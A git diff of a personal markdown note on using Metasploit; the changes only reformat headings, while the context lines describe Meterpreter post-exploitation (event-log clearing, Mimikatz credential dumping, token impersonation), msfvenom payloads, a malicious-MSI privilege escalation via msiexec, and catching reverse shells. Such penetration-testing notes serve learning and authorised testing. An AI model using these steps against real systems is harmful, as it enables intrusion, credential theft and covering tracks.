@@ -1,9 +1,9 @@
 # Using Metasploit
 
-author:: Nathan Acks  
-date:: 2022-04-22
+**author**:: Nathan Acks  
+**date**:: 2022-04-22
 
-# Console ("msfconsole")
+## Console ("msfconsole")
 
 Basic Metasploit flow:
 
@@ -13,7 +13,7 @@ Basic Metasploit flow:
 
 You can use msfconsole as a shell, but there's no redirect functionality.
 
-## Commands
+### Commands
 
 * `back` - exit the current module
 * `db_nmap $FLAGS $IP` - run nmap and dump the results into the Metasploit DB; all nmap $FLAGS are supported and Metasploit will elevate privileges if necessary
@@ -43,7 +43,7 @@ Note that you can also call regular shell commands (`ip`, `ls`, etc.) from msfco
 
 * [Using "nmap"](nmap.md)
 
-## Modules
+### Modules
 
 Module categories:
 
@@ -61,7 +61,7 @@ Note that Metasploit 6 apparently calls these "framework plugins" now.
 * ALSO REMEMBER: Be sure to set LHOST (and, when applicable, SRVHOST) correctly, even if it's not indicated by the module. Metasploit's guesses about which interface to use aren't always correct... (I find using the explicit IP address works better than specifying the interface device or leaving SRVHOST at the default of 0.0.0.0.)
 * ALSO ALSO REMEMBER: Sometimes you might find yourself in the position of trying to exploit a service over an SSH tunnel (for example, if you're trying to exploit a service that's not exposed externally in order to elevate your privileges). When doing this, remember that LHOST is still your machine's external address, as the exploit won't be connecting back over the SSH tunnel (obviously)!
 
-## Module Options
+### Module Options
 
 The common RHOSTS option accepts IP addresses, ranges, CIDR networks, and even a file with one target per line (specify as `file:/path/to/file.txt`).
 
@@ -77,7 +77,7 @@ Equivalent module commands:
 
 Some exploit modules have a `check` option which attempts to determine if a target is vulnerable without actually exploiting it. Alternately, other modules have a paired auxiliary scanner. Many *don't* have a check at all. YMMV!
 
-## Scanners
+### Scanners
 
 Use `search portscan` to display built-in Metasploit port scanners. Note that `msfconsole` needs to be run as root for many scans to work - just like Nmap. That said, in my experience the fancier TCP scans (for example, SYN) don't work over a VPN... So maybe best to stick with Nmap.
 
@@ -91,7 +91,7 @@ Metasploit has a variety of Samba/CIFS scanners too (use `search scanner/smb` to
 
 * [Metasploit Documentation: Scanning and Managing Hosts](https://docs.rapid7.com/metasploit/scanning-and-managing-hosts/)
 
-## Payloads
+### Payloads
 
 Payloads can be divided into:
 
@@ -112,11 +112,11 @@ If you initially get a native shell, use the `post/multi/manage/shell_to_meterpr
 * [Metasploit Basics, Part 8: Exploitation with EternalBlue](https://www.hackers-arise.com/post/2017/06/12/metasploit-basics-part-8-exploitation-with-eternalblue)
 * [Metasploit - Payload](https://www.tutorialspoint.com/metasploit/metasploit_payload.htm)
 
-# Meterpreter
+## Meterpreter
 
 The Meterpreter reverse shell *requires* a connection back to msfconsole using multi/handler.
 
-## Commands
+### Commands
 
 * `background` - background the current session and return to the Metasploit console
 * `clearenv` - clears the (Windows) event logs (kinda obvious)
@@ -147,7 +147,7 @@ The Meterpreter reverse shell *requires* a connection back to msfconsole using m
 
 Meterpreter sessions can be backgrounded using the `background` command, and all sessions can be backgrounded using `CTRL + Z`. List sessions using the `sessions` command, and foreground a session using `session -i #`, where `#` is the session number.
 
-## Modules
+### Modules
 
 Potentially useful Metsploit modules to `run` from/besides Meterpreter:
 
@@ -174,7 +174,7 @@ The advantage of setting up a SOCKS proxy on the target is that you can then use
 * [Dumping Windows Password Hashes Using Metasploit](https://www.utc.edu/sites/default/files/2021-04/4660-lab6.pdf)
 * [Windows Password Hashes](../notes/windows-password-hashes.md)
 
-## Loading PowerShell
+### Loading PowerShell
 
 ```meterpreter
 load powershell
@@ -183,7 +183,7 @@ powershell_shell
 
 *Don't* try to exit PowerShell - trying to do this produces consistent hangs for me. Instead, background the process with `^Z`.
 
-## Using Mimikatz
+### Using Mimikatz
 
 Use `load kiwi` to load up Mimikatz. Sub-commands:
 
@@ -200,7 +200,7 @@ wdigest          # Attempt to retrieve wdigest creds
 * [Using Mimikatz](mimikatz.md)
 * [Kerberos](kerberos.md)
 
-## Log In as a User
+### Log In as a User
 
 ```meterpreter
 load incognito
@@ -210,7 +210,7 @@ impersonate_token $DOMAIN\\$USER
 
 Not 100% sure where the "tokens" come from here... Mimikatz, maybe?
 
-## Process Migration
+### Process Migration
 
 I *think* that Meterpreter is being run directly from memory, and what `migrate` is doing is basically creating a new process using the memory of a different application, hopping to that process, and then shutting down the old process.
 
@@ -233,7 +233,7 @@ Note that Meterpreter will happily let you migrate from a privileged to an unpri
 * [Multiple Ways to Persistence on Windows 10 with Metasploit](https://www.hackingarticles.in/multiple-ways-to-persistence-on-windows-10-with-metasploit/)
 * [Return-orientated programming (Wikipedia)](https://en.wikipedia.org/wiki/Return-oriented_programming)
 
-# Venom ("msfvenom")
+## Venom ("msfvenom")
 
 Msfvenom is a tool to create custom versions of Metasploit payloads, encoded into a variety of different binary formats and scripts. For example:
 
@@ -316,13 +316,13 @@ System-specific shell codes can also be produced by appropriately varying the `-
 
 * [Shell to Meterpreter Upgrade](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/manage/shell_to_meterpreter)
 
-## 32-Bit Windows Programs
+### 32-Bit Windows Programs
 
 By default, msfvenom produces 64-bit executables when using the `-f exe`. This doesn't work, however, if you're trying to replace a program in Program Files (x86). In this case, you'll need to explicitly instruct msfvenom to encode a 32-bit binary using  `-e x86/shikata_ga_nai`.
 
 * [How do you send a 64 bit meterpreter stager?](https://security.stackexchange.com/a/83410)
 
-## Malicious MSI Files
+### Malicious MSI Files
 
 If `AlwaysInstallElevated`  is set to 1 under both of the following registry keys, then MSI installers will run as SYSTEM.
 
@@ -345,6 +345,6 @@ Then install on the target to get a shell:
 msiexec /quiet /qn /i $INSTALLER.msi
 ```
 
-## Catching Shells
+### Catching Shells
 
 Use the `exploit/multi/handler` module in Metasploit to catch the shells produced using Msfvenom (note that you'll need to use `set payload` to tell Metasploit *what* it's catching!). We can catch both regular reverse shells and Meterpreter sessions this way.
